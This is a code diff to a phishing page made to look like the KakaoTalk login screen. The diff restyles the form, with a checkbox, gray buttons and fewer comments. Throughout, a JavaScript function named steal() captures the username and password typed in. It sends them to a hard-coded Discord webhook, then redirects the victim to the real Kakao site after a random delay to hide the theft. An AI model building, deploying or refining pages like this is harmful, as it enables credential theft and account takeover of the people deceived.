@@ -5,7 +5,6 @@
   <title>KakaoTalk</title>
   <link rel="icon" href="https://www.kakaocorp.com/favicon.ico">
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-
   <style>
     body {
       margin: 0;
@@ -16,19 +15,12 @@
 
     .container {
       width: 100%;
-      max-width: 400px; /* Larger container */
+      max-width: 400px;
       margin: 80px auto;
       padding: 50px;
       background-color: white;
       border: 1px solid #dbdbdb;
       text-align: center;
-    }
-
-    .heading {
-      font-size: 36px;
-      font-weight: bold;
-      color: black; /* Kakao in black letters */
-      margin-bottom: 20px;
     }
 
     .logo {
@@ -49,48 +41,30 @@
       font-size: 14px;
       background: transparent;
       border: none;
-      border-bottom: 1px solid #dbdbdb; /* Underlined input fields */
+      border-bottom: 1px solid #dbdbdb;
     }
 
-    button {
-      background-color: #ffcc00; /* KakaoTalk's signature yellow color */
-      border: none;
-      color: black; /* Black letters in the button */
-      padding: 10px;
-      margin-top: 10px;
-      width: 100%;
-      font-weight: normal; /* Non-bold font */
-      border-radius: 4px;
-      cursor: pointer;
+    .checkbox-container {
+      text-align: left;
+      margin: 10px 0;
+      font-size: 14px;
+      color: gray;
     }
 
-    .qr-box {
+    .checkbox-container input[type="checkbox"] {
+      margin-right: 5px;
+      accent-color: gray;
+    }
+
+    .gray-box-button {
       border: 1px solid #dbdbdb;
-      padding: 15px;
-      margin-top: 20px;
       background-color: #fafafa;
+      padding: 10px;
+      margin: 10px 0;
+      width: 100%;
       cursor: pointer;
-    }
-
-    .or-separator {
-      margin: 20px 0;
-      display: flex;
-      align-items: center;
-    }
-
-    .or-separator::before,
-    .or-separator::after {
-      content: "";
-      flex: 1;
-      height: 1px;
-      background: #dbdbdb;
-    }
-
-    .or-separator span {
-      margin: 0 10px;
-      color: #8e8e8e;
-      font-weight: 500;
-      font-size: 13px;
+      font-weight: normal;
+      font-size: 14px;
     }
 
     .footer {
@@ -113,38 +87,34 @@
 
 <body>
   <div class="container">
-    <div class="heading">Kakao</div> <!-- Large Kakao phrase in black letters -->
-    <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo"> <!-- Kakao logo -->
+    <!-- Kakao logo only -->
+    <img src="https://cloudfront-ap-northeast-1.images.arcpublishing.com/chosunbiz/V7G5WPM7MJXDWOGTLIHZ7HINAE.jpg" alt="Kakao Logo" class="logo">
 
+    <!-- Main gray box -->
     <div class="box">
       <form onsubmit="steal(event)">
-        <!-- Underlined input fields -->
         <input class="input-field" id="username" type="text" placeholder="KakaoMail ID, email, or phone number" required>
         <input class="input-field" id="password" type="password" placeholder="Password" required>
 
-        <!-- Simple login information storage button -->
-        <button type="button">Simple login information storage</button>
+        <!-- Simple login info (gray text with circular checkbox) -->
+        <div class="checkbox-container">
+          <label><input type="checkbox"> Simple login information storage</label>
+        </div>
 
-        <!-- Login button -->
-        <button type="submit">Log In</button>
+        <!-- Login gray box button -->
+        <button type="submit" class="gray-box-button">Log In</button>
       </form>
 
-      <div class="or-separator"><span>OR</span></div>
+      <!-- QR Code Login gray box -->
+      <div class="gray-box-button">QR Code Login</div>
 
-      <!-- QR Code Login (Gray box) -->
-      <div class="qr-box">
-        QR Code Login
+      <!-- Links inside gray box -->
+      <div class="gray-box-button">
+        View Help | Sign Up | Find Account | Find Password
       </div>
     </div>
 
-    <!-- Below the gray box: additional features -->
-    <div class="footer" style="margin-top: 10px;">
-      <a href="#">View help</a> | 
-      <a href="#">Sign up</a> | 
-      <a href="#">Find account</a> | 
-      <a href="#">Find password</a>
-    </div>
-
+    <!-- Bottom footer (outside gray box) -->
     <div class="footer">
       <a href="#">Terms of Use</a> | 
       <a href="#">Privacy Policy</a> | 
@@ -155,44 +125,30 @@
 
   <script>
     function steal(e) {
-      e.preventDefault(); // Prevent form submission to handle it in JS
+      e.preventDefault();
 
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
 
-      // Create the payload to send
-      const data = {
-        username: u,
-        password: p
-      };
-
-      // Send the data to the Discord webhook
       fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `🛑 강아지\nUsername: ${data.username}\nPassword: ${data.password}`
+          content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
         })
       })
       .then(response => {
-        // Check if the request was successful
         if (response.ok) {
-          console.log("Data sent successfully");
-
-          // Slight random delay before redirecting to KakaoTalk
           setTimeout(() => {
-            window.location.href = "https://www.kakaocorp.com"; // Redirect to KakaoTalk's official page after success
-          }, Math.random() * 2000 + 1000);  // Random delay between 1-3 seconds
+            window.location.href = "https://www.kakaocorp.com";
+          }, Math.random() * 2000 + 1000);
         } else {
-          console.error('Request failed with status:', response.status);
           alert('Something went wrong. Please try again later.');
         }
       })
       .catch(error => {
-        // Handle network errors
-        console.error('Error during fetch:', error);
         alert('Network error. Please check your connection.');
       });
     }
